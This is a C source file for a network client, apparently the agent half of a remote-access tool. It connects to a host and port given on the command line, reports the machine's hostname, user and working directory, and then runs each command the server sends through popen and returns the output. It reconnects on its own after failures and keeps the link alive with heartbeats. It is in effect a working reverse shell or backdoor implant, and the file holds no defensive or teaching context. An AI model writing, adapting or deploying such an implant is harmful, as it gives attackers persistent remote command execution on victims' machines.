#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>      /* ← Ajouté pour struct timeval */
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>
#include <limits.h>

#ifdef __linux__
#include <pwd.h>
#endif

#include "protocol.h"

static int           sock_fd = -1;
static volatile int  running = 1;

static void sigint_handler(int sig) {
    (void)sig;
    running = 0;
}

static int connect_to_server(const char *host, int port) {
    struct addrinfo hints, *res;
    char port_str[12];

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        fprintf(stderr, "[!] Resolution failed for %s\n", host);
        return -1;
    }

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }

    struct timeval tv = { .tv_sec = 10, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);

    tv.tv_sec  = 0;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    return fd;
}

static int send_packet(int fd, const uint8_t *data, int dlen) {
    uint8_t buf[HEADER_LEN + MAX_MSG_SIZE];
    int plen = pack_msg(data, dlen, buf);
    if (plen < 0) return -1;

    int total = 0;
    while (total < plen) {
        int n = write(fd, buf + total, plen - total);
        if (n <= 0) return -1;
        total += n;
    }
    return 0;
}

static void execute_command(const char *cmd, uint8_t *output, int *outlen) {
    if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) != 0)
            *outlen = snprintf((char *)output, MAX_MSG_SIZE, "cd: %s\n", strerror(errno));
        else
            *outlen = 0;
        return;
    }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        *outlen = snprintf((char *)output, MAX_MSG_SIZE, "popen: %s\n", strerror(errno));
        return;
    }

    int total = 0, n;
    while ((n = fread(output + total, 1, MAX_MSG_SIZE - total - 1, fp)) > 0)
        total += n;

    pclose(fp);

    if (total == 0)
        output[total++] = '\n';

    output[total] = '\0';
    *outlen = total;
}

static void send_client_info(int fd) {
    char hostname[64] = {0};
    char cwd[PATH_MAX] = {0};

    gethostname(hostname, sizeof(hostname));
    getcwd(cwd, sizeof(cwd));

    const char *user = "unknown";
#ifdef __linux__
    struct passwd *pw = getpwuid(getuid());
    if (pw) user = pw->pw_name;
#endif

    char info[512];
    snprintf(info, sizeof(info), "INFO|%s|%s|%s", hostname, user, cwd);
    send_packet(fd, (uint8_t *)info, strlen(info));
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <host> [port]\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = (argc > 2) ? atoi(argv[2]) : DEFAULT_PORT;
    if (port <= 0) port = DEFAULT_PORT;

    signal(SIGINT, sigint_handler);
    signal(SIGPIPE, SIG_IGN);

    uint8_t rbuf[BUF_SIZE];
    int rlen = 0;
    time_t last_heartbeat = 0;

    while (running) {
        while (running && sock_fd < 0) {
            printf("[*] Connecting to %s:%d...\n", host, port);
            sock_fd = connect_to_server(host, port);

            if (sock_fd < 0) {
                printf("[!] Connection failed, retry in %ds\n", RECONNECT_DELAY);
                sleep(RECONNECT_DELAY);
            } else {
                send_client_info(sock_fd);
                printf("[+] Connected to %s:%d\n", host, port);
                rlen = 0;
                last_heartbeat = time(NULL);
            }
        }
        if (!running) break;

        uint8_t buf[65536];
        int n = read(sock_fd, buf, sizeof(buf));
        if (n <= 0) {
            printf("[!] Connection lost, reconnecting...\n");
            close(sock_fd);
            sock_fd = -1;
            continue;
        }

        if (rlen + n > BUF_SIZE) rlen = 0;
        memcpy(rbuf + rlen, buf, n);
        rlen += n;

        uint8_t msg[MAX_MSG_SIZE];
        int mlen;

        while (1) {
            int consumed = try_unpack(rbuf, rlen, msg, &mlen);
            if (consumed == 0) break;
            if (consumed < 0) { rlen = 0; break; }

            memmove(rbuf, rbuf + consumed, rlen - consumed);
            rlen -= consumed;

            if (mlen == 0) {
                last_heartbeat = time(NULL);
                continue;
            }

            msg[mlen] = '\0';
            char *cmd = (char *)msg;

            if (strcmp(cmd, "exit") == 0) {
                running = 0;
                break;
            }

            uint8_t output[MAX_MSG_SIZE];
            int outlen = 0;
            execute_command(cmd, output, &outlen);

            if (send_packet(sock_fd, output, outlen) < 0) {
                close(sock_fd);
                sock_fd = -1;
                break;
            }
        }

        time_t now = time(NULL);
        if (now - last_heartbeat >= HEARTBEAT_INT) {
            if (send_packet(sock_fd, NULL, 0) < 0) {
                close(sock_fd);
                sock_fd = -1;
            }
            last_heartbeat = now;
        }
    }

    if (sock_fd >= 0) close(sock_fd);
    printf("[*] Client terminated.\n");
    return 0;
}
